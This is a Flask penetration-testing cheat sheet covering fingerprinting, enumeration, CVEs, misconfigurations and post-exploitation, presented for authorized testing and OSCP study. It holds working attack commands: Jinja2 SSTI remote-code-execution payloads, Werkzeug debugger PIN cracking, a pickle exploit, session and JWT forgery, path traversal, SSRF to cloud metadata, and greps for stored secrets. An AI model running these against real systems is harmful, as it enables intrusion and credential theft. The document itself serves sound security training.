# Flask

> Python micro-framework reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers / cookies

Flask default `session` cookie (signed, not encrypted, base64-encoded JSON):

```bash
curl -sI http://<TARGET>/ | grep -iE '^(server|set-cookie)'
```

Expected output:

```text
Server: Werkzeug/2.2.2 Python/3.10.6
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.YzR...; HttpOnly; Path=/
```

Two strong fingerprints:
- `Set-Cookie: session=...` (Flask default session cookie name)
- `Server: Werkzeug/x.y.z Python/x.y.z` (Flask dev server)

Werkzeug headers are the strongest signal for Flask.

### Default error pages

Flask `debug=True` shows the Werkzeug debugger:

```text
Werkzeug Debugger
...
Traceback (most recent call last):
  File "/app/app.py", line 42, in index
...
```

Werkzeug debugger has an interactive Python console at each frame (`/console`
or a pin-protected shell). This is a direct RCE vector if exposed.

Flask `debug=False` -> generic `500 Internal Server Error`, no details.

Default Flask 404 (no custom handler):

```html
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

The "Werkzeug" in headers, the phrase "The requested URL was not found on the
server", and the `session` cookie together confirm Flask.

### nmap / whatweb

```bash
nmap -sV -p 80,443,5000,8000,8080 --script http-headers,http-title <TARGET>
whatweb -a 3 http://<TARGET>/
```

Default Flask dev port: `5000`. Gunicorn behind nginx often on 8000.

---

## 2. Enumeration

### Standard Flask paths

```bash
for p in / /static/ /static/css/ /static/js/ /admin/ /api/ /api/v1/ \
         /login /logout /register /dashboard /health /metrics /debug \
         /console /shell; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

### Werkzeug debugger detection

The Werkzeug debugger, when `debug=True`:

- Injects `/console` link in traceback pages
- Sets `__debugger__` cookie on first load
- `/console` prompts for a PIN (printed in stdout on startup)

```bash
curl -s http://<TARGET>/nonexistent | grep -iE 'werkzeug|debugger|console'
```

### /static/ enumeration

Flask default static route: `/static/<path>`. Directory listing is off by default,
but if a custom static handler is misconfigured:

```bash
curl -s http://<TARGET>/static/
curl -s http://<TARGET>/static/js/app.js
curl -s http://<TARGET>/static/js/app.js.map
```

### Endpoint enumeration via OPTIONS

```bash
for ep in /api /api/v1 /admin; do
  echo "=== $ep ==="
  curl -s -X OPTIONS -i http://<TARGET>$ep | grep -i allow
done
```

### Method-based enumeration

Flask routes are bound to methods. Try GET, POST, PUT, DELETE on each:

```bash
for m in GET POST PUT DELETE OPTIONS; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X $m http://<TARGET>/api/users)
  echo "$m -> $code"
done
```

### Directory brute force

```bash
feroxbuster -u http://<TARGET>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x py,json,txt,html,bak
```

### Jinja2 template indicator

Any Jinja2 SSTI test:

```bash
curl "http://<TARGET>/page?name={{7*7}}"
curl "http://<TARGET>/page?name={{7*'7'}}"
```

If output is `49` -> Jinja2 SSTI. If `7777777` -> Jinja2 confirmed (vs Twig
which returns `49` for both cases with different behavior).

---

## 3. Known CVEs

### CVE-2023-30861 - Session cookie disclosure

Flask < 2.2.5 / < 2.3.2 in some configurations sends the session cookie to
proxied subdomains if `SESSION_COOKIE_DOMAIN` is misconfigured. Session
hijacking risk.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-30861
Affected: Flask 2.2.0 - 2.2.4, 2.3.0 - 2.3.1.

### CVE-2018-1000656 - DoS via malicious JSON

`flask.json` parses arbitrarily nested JSON -> stack overflow / DoS.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-1000656
Affected: Flask 0.12.2 and earlier.

### CVE-2019-1010083 - DoS via JSON (revised)

Revised DoS in JSON parsing. Low severity.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-1010083
Affected: Flask 1.0 and earlier.

### Werkzeug CVEs (transitive)

Flask apps using Werkzeug are affected by Werkzeug CVEs:

| CVE | Type | Affected |
|-----|------|----------|
| CVE-2023-46136 | Multipart DoS | Werkzeug < 3.0.1 |
| CVE-2023-23934 | Cookie parsing | Werkzeug < 2.2.3 |
| CVE-2023-25577 | Multipart DoS | Werkzeug < 2.2.3 |

NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-46136
NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-23934
NVD: https://nvd.nist.gov/vuln/detail/CVE-2023-25577

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 2.2.0-2.2.4, 2.3.0-2.3.1 | Cookie leak | CVE-2023-30861 |
| <= 0.12.2 | JSON DoS | CVE-2018-1000656 |
| Werkzeug < 3.0.1 | Multipart DoS | CVE-2023-46136 |

Flask itself is small; most real-world vulnerabilities live in:
- Application code (SSTI, IDOR, SSRF)
- Werkzeug (transitive)
- Jinja2 (SSTI, CVE-2024-22195 / CVE-2024-34064 / CVE-2024-56201)

---

## 4. Exploitation Patterns

### Werkzeug debugger PIN -> RCE

If `debug=True` in production (rare but catastrophic):

1. Trigger any error to load `/console`.
2. The console requires a PIN. If the app crashes at startup, the PIN is
   printed to stdout (look at logs if you can read them).

To compute the PIN (Werkzeug algorithm):

```bash
# PIN depends on: username, module name, app name, MAC address of the
# host (or container ID), and a machine-id. Use `werkzeug-pin-cracker`
# or `werkzeug-debugger-pin` if you can read /etc/machine-id and /proc/net/arp
git clone https://github.com/pberba/werkzeug-pin
python werkzeug-pin/pin.py \
  --public-bits $(curl -s http://<TARGET>/console | grep -oE '__debugger__.*' | grep -oE 'public_bits.*')
```

If you get the PIN, open `/console` and execute Python:

```python
import os
os.popen('id').read()
os.popen('cat /etc/passwd').read()
```

### Jinja2 SSTI -> RCE

If user input reaches `render_template_string(...)`:

```bash
# Detection
curl "http://<TARGET>/page?name={{7*7}}"           # 49
curl "http://<TARGET>/page?name={{7*'7'}}"         # 7777777 (Jinja2)

# Config disclosure
curl "http://<TARGET>/page?name={{config}}"
curl "http://<TARGET>/page?name={{config.items()}}"

# RCE (Jinja2 3.x)
curl "http://<TARGET>/page?name={{cycler.__init__.__globals__.os.popen('id').read()}}"
curl "http://<TARGET>/page?name={{lipsum.__globals__['os'].popen('id').read()}}"
curl "http://<TARGET>/page?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
```

See SSTI.md for the full payload list.

### Flask session cookie forgery

Flask sessions are signed (HMAC) but not encrypted. If `SECRET_KEY` leaks
(or is guessable), forge arbitrary sessions:

```bash
# Decode current session (no key needed)
python3 -c "import base64; print(base64.urlsafe_b64decode('eyJ1c2VyX2lkIjoxfQ==' + '=='*2))"

# Forge with flask-unsign
pip install flask-unsign
flask-unsign --decode --cookie '<cookie>'
flask-unsign --sign --cookie "{'user_id': 1, 'role': 'admin'}" --secret 'leaked-secret'
flask-unsign --unsign --cookie '<cookie>' --wordlist /usr/share/wordlists/rockyou.txt
```

Then set the forged cookie:

```bash
curl -H "Cookie: session=<forged>" http://<TARGET>/admin/
```

### SECRET_KEY brute force

If the key is weak (e.g. `secret`, `changeme`, `flask`):

```bash
flask-unsign --unsign --cookie '<cookie>' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
```

### SQL injection via SQLAlchemy raw

If the app uses `.execute("... %s" % user_input)`:

```bash
curl "http://<TARGET>/search?q=test' UNION SELECT 1,2,3-- -"
```

Use `sqlmap` with `--dbms=sqlite` / `--dbms=postgresql` / `--dbms=mysql`.

### Path traversal in send_file

If the app calls `send_file(user_path)`:

```bash
curl "http://<TARGET>/download?file=../../../../etc/passwd"
curl "http://<TARGET>/download?file=....//....//....//etc/passwd"
```

### Pickle deserialization

If the app unpickles session / cache / API data:

```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

### SSRF via requests / urllib

If the app fetches user-supplied URLs:

```bash
curl "http://<TARGET>/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://<TARGET>/fetch?url=http://127.0.0.1:5000/admin/"
curl "http://<TARGET>/fetch?url=file:///etc/passwd"
```

---

## 5. Misconfigurations

### debug=True in production

```bash
curl -s http://<TARGET>/nonexistent | grep -iE 'werkzeug|debugger|traceback'
```

Direct RCE vector via Werkzeug console (see section 4).

### Werkzeug dev server exposed

`Server: Werkzeug/x.y.z Python/x.y.z` means the app is running on the
development server (not gunicorn / uWSGI). This is a production
misconfiguration and typically correlated with `debug=True`.

### SECRET_KEY hardcoded / weak

Look for hardcoded keys in source:

```bash
for f in app.py config.py .env .env.bak settings.py; do
  curl -s "http://<TARGET>/$f" | grep -iE 'SECRET_KEY|FLASK_SECRET'
done
```

Common weak values: `secret`, `changeme`, `dev`, `flask`, `mysecretkey`.

### SESSION_COOKIE_SECURE=False

Session cookie sent over HTTP -> MITM session hijack:

```bash
curl -sI http://<TARGET>/ | grep -iE 'set-cookie.*session'
```

### SESSION_COOKIE_HTTPONLY=False

Cookie accessible via JS -> XSS session theft:

```bash
curl -sI http://<TARGET>/ | grep -iE 'set-cookie.*session'
```

### CORS wildcard with credentials

```bash
curl -sI -H "Origin: https://evil.com" http://<TARGET>/api/ | grep -i 'access-control'
# If Access-Control-Allow-Origin: https://evil.com AND Access-Control-Allow-Credentials: true -> critical
```

### Static route misconfigured

If `/static/` is served by the app (not nginx) and path handling is custom:

```bash
curl "http://<TARGET>/static/../../etc/passwd"
curl "http://<TARGET>/static/..%2f..%2fetc%2fpasswd"
```

### Exposed .env / config

```bash
for f in .env .env.bak config.py config.py.bak app.py app.py.bak \
         settings.py requirements.txt Pipfile.lock; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$f")
  echo "$code  $f"
done
```

`requirements.txt` reveals exact library versions -> CVE mapping.

### Open redirect via `next` parameter

```bash
curl "http://<TARGET>/login?next=https://evil.com"
curl "http://<TARGET>/login?next=//evil.com"
curl "http://<TARGET>/login?next=/\evil.com"
```

---

## 6. Post-Exploitation

### Config file locations

| Layout | Path |
|--------|------|
| Flat | `/app/app.py`, `/app/config.py`, `/app/.env` |
| Package | `/app/myapp/__init__.py`, `/app/myapp/config.py` |
| Docker | `/app/app.py`, `/code/.env` |
| Systemd | `/etc/systemd/system/myapp.service` (EnvironmentFile=) |
| Gunicorn | `gunicorn.conf.py`, `/etc/gunicorn/conf.py` |

### What to look for

```bash
find / -name 'app.py' -o -name 'config.py' -o -name '.env' 2>/dev/null
grep -rE 'SECRET_KEY|DATABASE_URL|AWS_|STRIPE_|SENDGRID_|JWT_SECRET|PASSWORD' /app/ /code/ /var/www/ 2>/dev/null
```

Key items:

- `SECRET_KEY` / `JWT_SECRET` -> forge sessions / JWT
- `DATABASE_URL` -> full DB connection string (user:pass@host/db)
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` -> cloud
- `STRIPE_SECRET_KEY` -> payments
- `SENDGRID_API_KEY`, `MAILGUN_API_KEY` -> email
- `REDIS_URL` -> cache / Celery broker (often no auth)
- `SENTRY_DSN` -> error reporting (may leak app data)

### Flask session table (SQLAlchemy / Redis)

If sessions stored server-side:

```bash
# In DB
psql $DATABASE_URL -c "SELECT * FROM sessions;"

# In Redis
redis-cli -u $REDIS_URL
> keys *
> get session:<id>
```

### JWT secret reuse

If the app uses `JWT_SECRET` for both Flask sessions and JWT:

```bash
# Forge JWT
python3 -c "
import jwt
print(jwt.encode({'user_id': 1, 'role': 'admin'}, 'leaked-secret', algorithm='HS256'))
"
```

### Logs

```bash
ls -la /var/log/flask/ /var/log/gunicorn/ 2>/dev/null
tail -n 200 /var/log/gunicorn/error.log
```

Werkzeug debugger logs PIN on startup:

```text
 * Debugger is active!
 * Debugger PIN: 123-456-789
```

If logs are readable, PIN is available -> RCE.

### Environment variables

```bash
cat /proc/<pid>/environ | tr '\0' '\n'
systemctl show myapp --property=Environment
```

### Jinja2 template files

If you have filesystem access, review templates for logic leaks:

```bash
find / -name '*.html' -path '*templates*' 2>/dev/null
cat /app/templates/*.html | grep -E 'admin|is_admin|role'
```

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `Server: Werkzeug/x.y.z Python/x.y.z` header AND the `session=` cookie - together they identify Flask + dev server.

> [!IMPORTANT]
> OSCP report: for Werkzeug debugger RCE, screenshot the `Debugger PIN:` line from logs (or the computed PIN) AND the code execution output in `/console`.

> [!IMPORTANT]
> OSCP report: for SSTI, screenshot both the `{{7*7}}` -> `49` detection AND the RCE payload output.

---

## 8. References

- Flask official docs - https://flask.palletsprojects.com/
- NVD search - https://nvd.nist.gov/vuln/search/results?query=flask
- Werkzeug docs - https://werkzeug.palletsprojects.com/
- Jinja2 SSTI - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- flask-unsign - https://github.com/Paradoxis/Flask-Unsign
- Werkzeug PIN crack - https://github.com/pberba/werkzeug-pin
- HackTricks - Flask - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
